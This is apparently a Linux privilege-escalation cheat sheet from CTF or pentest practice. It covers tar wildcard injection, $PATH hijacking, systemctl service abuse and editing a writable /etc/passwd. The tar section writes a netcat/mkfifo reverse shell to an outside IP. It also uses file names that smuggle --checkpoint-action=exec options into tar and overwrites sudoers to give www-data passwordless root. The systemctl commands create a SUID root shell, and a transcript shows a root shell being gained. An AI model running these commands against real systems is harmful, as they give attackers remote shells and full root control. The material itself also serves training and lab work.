# TAR Wildcards

## tar -cf
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.3.85 4443 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"

echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
echo "/var/www/html"  > --checkpoint=1
[HelpNet Security] https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/
```

# Path Injection

## $PATH Injection (example)
```
cd /tmp
echo "/bin/bash" > ls
chmod +x /ls
export PATH=/tmp:$PATH  <=== this exports our fake path
Reset path back to default:  "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH"
```

## $PATH Injection (example 2)
```
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl 
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```
# SYSTEMCTL

## /bin/systemctl
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chown root:root /tmp/sh; chmod u+s /tmp/sh"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "python /tmp/shell.py"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

# Modifying /etc/passwd

## /etc/passwd file
```
The /etc/passwd file contains one entry per line for each user (user account) of the system. All fields are separated by a colon : symbol. Total of seven fields as follows. Generally, /etc/passwd file entry looks as follows:

test:x:0:0:root:/root:/bin/bash => [as divided by colon (:)]

    1. Username: It is used when user logs in. It should be between 1 and 32 characters in length.
    2. Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
    3. User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
    4. Group ID (GID): The primary group ID (stored in /etc/group file)
    5. User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
    6. Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
    7. Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

How to exploit a writable /etc/passwd

If we have a writable /etc/passwd file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. 

Create the password you want to add: "openssl passwd -1 -salt [salt] [password]"
```